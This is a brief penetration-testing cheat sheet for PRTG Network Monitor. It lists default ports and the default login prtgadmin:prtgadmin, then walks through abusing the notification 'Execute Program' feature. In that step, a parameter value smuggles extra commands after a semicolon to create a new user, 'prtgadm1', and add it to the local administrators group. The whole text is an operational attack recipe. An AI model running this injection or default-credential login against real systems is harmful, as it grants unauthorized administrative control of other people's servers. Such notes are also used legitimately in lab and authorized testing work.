# Discovery/Footprinting/Enumeration
- Default ports 80, 443, or 8080
- Default credentials -> prtgadmin:prtgadmin

# Create user
1. Setup -> Account Settings -> Notifications
2. Add new notification -> EXECUTE PROGRAM
3. Program File select Demo exe notification - outfile.ps1
4. In parameter enter this
```
test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add.
```
5. Execute manually
